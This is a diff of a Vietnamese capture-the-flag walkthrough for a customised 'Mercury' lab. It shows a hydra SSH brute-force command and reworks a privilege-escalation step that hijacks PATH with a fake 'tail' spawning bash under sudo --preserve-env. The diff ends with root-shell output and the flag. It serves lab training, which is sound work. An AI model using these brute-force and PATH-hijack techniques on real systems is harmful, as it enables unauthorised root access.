@@ -110,7 +110,7 @@ hydra -L username.txt -P password.txt ssh://10.0.2.4 -V
 
 ![exploit](/posts/mercury-walkthrough/exploit-8.PNG)
 
-Kết quả có 2 combination (nhưng là vì lab này đã được custom lại nên đã được thêm user `cmcleuleu`, còn bản gốc thì user_flag nằm ngay trong user `webmaster` ha). Tiến hành login user `cmcleuleu` và get user flag.
+Kết quả có 2 combination (nhưng là vì lab này đã được custom lại nên có thêm user `cmcleuleu`, còn bản gốc thì user_flag nằm ngay trong user `webmaster`). Tiến hành login user `cmcleuleu` và get user flag.
 
 ![user flag](/posts/mercury-walkthrough/user_flag.PNG)
 
@@ -134,34 +134,50 @@ Có thể thấy, user có thể thực thi script `/usr/bin/check_syslog.sh` v�
 
 ![check_syslog.sh](/posts/mercury-walkthrough/check_syslog.PNG)
 
-User không có quyền ghi file `check_syslog.sh` nhưng có thể thực thi nó, hơn thế nữa trong shell script có chứa lệnh `tail` được gọi. Từ đây, ta có thể tận dụng nó bằng cách symlink nó tới 1 chương trình có thể sinh ra shell (ví dụ như `vim`)
-
-`vim` có thể thực thi shell command thông qua syntax `:!`, tiến hành symlink _vim_ qua _tail_ và đồng thời set PATH cho đường dẫn hiện tại:
+User không có quyền ghi file `check_syslog.sh` nhưng có thể thực thi nó, hơn thế nữa trong shell script có chứa lệnh `tail` được gọi. Ý tưởng là ghi đè lệnh tail để gọi shell cùng với đó là chạy dưới quyền root.
 
 ```shell
-ln -s /usr/bin/vim tail
+linuxmaster@cmclabs1:~$ echo "/bin/bash" > tail
+linuxmaster@cmclabs1:~$ chmod 777 tail
+linuxmaster@cmclabs1:~$ export PATH=$(pwd):$PATH
 ```
 
-```shell
-export PATH=${pwd}:$PATH
-```
-
-![check_syslog.sh](/posts/mercury-walkthrough/symlink-to-vim.PNG)
-
-Bước cuối cùng, công việc thực thi script `check_syslog.sh` dưới chế độ _preserved environment_ cho PATH:
+Cuối cùng, thực thi script `check_syslog.sh` dưới chế độ _preserved environment_ cho PATH:
 
 ```shell
 sudo --preserve-env=PATH /usr/bin/check_syslog.sh
 ```
 
-Lúc này `vim` được mở lên, điều chúng ta cần làm là type `:shell`
+bÙm..
 
-![spawn shell](/posts/mercury-walkthrough/shell.PNG)
+```shell
+root@cmclabs1:/home/linuxmaster# cd /root
+root@cmclabs1:~# ls
+root_flag.txt
+root@cmclabs1:~# cat *
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
+@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
+@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
+@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
+@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
+@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
+@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
+@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
+@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
+@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
+@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
+@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
+@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
+@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
+@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
+@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
+@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
-Hit enter và root shell hiện ra:
-
-![get root](/posts/mercury-walkthrough/get_root.PNG)
-
-Flag:
-
-![flag](/posts/mercury-walkthrough/flag.png)
+Congratulations!!!
+If you have any feedback please contact me at autosys@cmcinfosec.com
+[root_cmcsoc_flag_1a7e3807f7122beb1527b54d6b46aad3]
+```
